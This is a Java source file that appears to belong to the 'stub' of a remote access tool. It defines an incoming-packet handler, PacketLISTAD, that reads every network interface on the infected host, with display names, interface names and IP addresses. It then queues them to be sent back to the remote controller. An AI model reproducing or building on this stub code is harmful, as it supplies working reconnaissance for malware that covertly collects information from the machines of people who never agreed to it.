package com.redpois0n.packets.incoming;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;

import com.redpois0n.Connection;
import com.redpois0n.stub.packets.outgoing.Packet56NetworkAdapter;


public class PacketLISTAD extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
		for (NetworkInterface netint : Collections.list(nets)) {
			ArrayList<InetAddress> list = Collections.list(netint.getInetAddresses());
			
			Connection.addToSendQueue(new Packet56NetworkAdapter(netint.getDisplayName(), netint.getName(), list));
		}
	}

}
